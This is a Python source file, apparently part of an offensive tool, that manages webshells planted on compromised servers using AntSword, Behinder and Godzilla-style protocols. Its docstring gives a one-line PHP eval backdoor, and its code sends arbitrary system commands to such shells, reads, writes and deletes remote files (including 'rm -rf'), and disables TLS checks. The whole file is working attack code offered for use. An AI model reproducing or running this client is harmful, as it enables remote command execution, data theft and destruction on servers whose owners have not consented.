"""WebShell 管理 — 兼容 AntSword/冰蝎/哥斯拉 协议"""
import base64
import json
import urllib.parse
from hashlib import md5

import httpx

from app_config.logging_config import get_logger

log = get_logger(__name__)

# ── 辅助函数 ──

def _aes_128_cbc_encrypt(data: str, key: bytes) -> str:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding
    iv = b'\x00' * 16
    padder = padding.PKCS7(128).padder()
    padded = padder.update(data.encode()) + padder.finalize()
    cipher = Cipher(algorithms.AES128(key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    ct = encryptor.update(padded) + encryptor.finalize()
    return base64.b64encode(ct).decode()

def _aes_128_cbc_decrypt(data_b64: str, key: bytes) -> str:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding
    iv = b'\x00' * 16
    ct = base64.b64decode(data_b64)
    cipher = Cipher(algorithms.AES128(key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    padded = decryptor.update(ct) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    return (unpadder.update(padded) + unpadder.finalize()).decode()

# ── 协议实现 ──

class AntSwordProtocol:
    """蚁剑 (AntSword) — 兼容标准 PHP eval shell

    你的 Shell: <?php @eval($_POST["pass"]);?>
    发送: POST pass=system('whoami');
    Shell eval 执行: system('whoami');
    """

    _HEADERS = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    @staticmethod
    async def exec(client: httpx.AsyncClient, url: str, password: str, cmd: str, shell_type: str) -> str:
        """直接发送 PHP 代码: system('cmd');"""
        # 转义单引号防止 PHP 代码注入 (CRITICAL-3)
        safe_cmd = cmd.replace("'", "'\\''")
        php_code = f"system('{safe_cmd}');"
        # urlencode 编码（标准表单 POST）
        body = urllib.parse.urlencode({password: php_code})
        try:
            resp = await client.post(
                url,
                content=body,
                headers=AntSwordProtocol._HEADERS,
                follow_redirects=False,
                timeout=15,
            )
            if resp.status_code == 200:
                text = resp.text.strip() if resp.text else ""
                return text[:3000] if text else "(命令执行成功，无回显)"
            return f"[HTTP {resp.status_code}] {url}"
        except httpx.ConnectError:
            return f"[连接失败] 无法连接 {url}"
        except httpx.TimeoutException:
            return f"[超时] 连接超时"
        except Exception as e:
            return f"[错误] {e}"


class BehinderProtocol:
    """冰蝎 (Behinder): AES-128-CBC 加密通信
    密钥: MD5(password)[:16]
    """

    _HEADERS = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }

    @staticmethod
    def _make_key(password: str) -> bytes:
        return md5(password.encode()).digest()[:16]

    @staticmethod
    async def exec(client: httpx.AsyncClient, url: str, password: str, cmd: str, shell_type: str) -> str:
        key = BehinderProtocol._make_key(password)
        payload = json.dumps({"action": "execCommand", "cmd": cmd})
        encrypted = _aes_128_cbc_encrypt(payload, key)
        body = urllib.parse.urlencode({password: encrypted})
        resp = await client.post(url, content=body, headers=BehinderProtocol._HEADERS)
        if resp.status_code == 200:
            try:
                return _aes_128_cbc_decrypt(resp.text.strip(), key)[:3000]
            except Exception:
                return resp.text[:3000]
        return f"[HTTP {resp.status_code}]"


class GodzillaProtocol:
    """哥斯拉 (Godzilla): AES-128-CBC 加密通信"""

    _HEADERS = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }

    @staticmethod
    def _make_key(password: str) -> bytes:
        return md5((password + "3c6e0b8a9c15224a").encode()).digest()[:16]

    @staticmethod
    async def exec(client: httpx.AsyncClient, url: str, password: str, cmd: str, shell_type: str) -> str:
        key = GodzillaProtocol._make_key(password)
        payload = json.dumps({"action": "execCommand", "cmd": cmd})
        encrypted = _aes_128_cbc_encrypt(payload, key)
        body = urllib.parse.urlencode({password: encrypted})
        resp = await client.post(url, content=body, headers=GodzillaProtocol._HEADERS)
        if resp.status_code == 200:
            try:
                return _aes_128_cbc_decrypt(resp.text.strip(), key)[:3000]
            except Exception:
                return resp.text[:3000]
        return f"[HTTP {resp.status_code}]"


PROTOCOL_MAP = {
    "antsword": AntSwordProtocol,
    "behinder": BehinderProtocol,
    "godzilla": GodzillaProtocol,
}


class WebShellService:
    """WebShell 管理"""

    def __init__(self):
        self._client = httpx.AsyncClient(timeout=30, verify=False)

    async def exec(self, url: str, password: str, command: str = "whoami",
                   shell_type: str = "php", protocol: str = "antsword") -> dict:
        proto_cls = PROTOCOL_MAP.get(protocol)
        if not proto_cls:
            return {"success": False, "error": f"不支持的协议: {protocol}"}
        try:
            result = await proto_cls.exec(self._client, url, password, command, shell_type)
            return {"success": True, "output": result}
        except Exception as e:
            log.warning(f"WebShell exec 失败 [{url}]: {e}")
            return {"success": False, "error": str(e), "output": str(e)}

    async def list_files(self, url, password, path="/", shell_type="php", protocol="antsword"):
        cmd = f"print_r(scandir('{path}'));" if shell_type == "php" else f"system('ls -la {path}');"
        return await self.exec(url, password, cmd, shell_type, protocol)

    async def read_file(self, url, password, path, shell_type="php", protocol="antsword"):
        cmd = f"readfile('{path}');" if shell_type == "php" else f"system('cat {path}');"
        return await self.exec(url, password, cmd, shell_type, protocol)

    async def write_file(self, url, password, path, content, shell_type="php", protocol="antsword"):
        b64 = base64.b64encode(content.encode()).decode()
        cmd = f"file_put_contents('{path}',base64_decode('{b64}'));"
        return await self.exec(url, password, cmd, shell_type, protocol)

    async def delete_file(self, url, password, path, shell_type="php", protocol="antsword"):
        cmd = f"unlink('{path}');" if shell_type == "php" else f"rm -rf {path}"
        return await self.exec(url, password, cmd, shell_type, protocol)

    async def mkdir(self, url, password, path, shell_type="php", protocol="antsword"):
        cmd = f"mkdir('{path}',0755);" if shell_type == "php" else f"mkdir -p {path}"
        return await self.exec(url, password, cmd, shell_type, protocol)

    async def test(self, url, password, protocol="antsword"):
        try:
            output = await self.exec(url, password, "whoami", protocol=protocol)
            if output["success"]:
                return {"ok": True, "user": output["output"][:200]}
            return {"ok": False, "error": output.get("output", "unknown")}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    async def close(self):
        await self._client.aclose()


webshell_service = WebShellService()
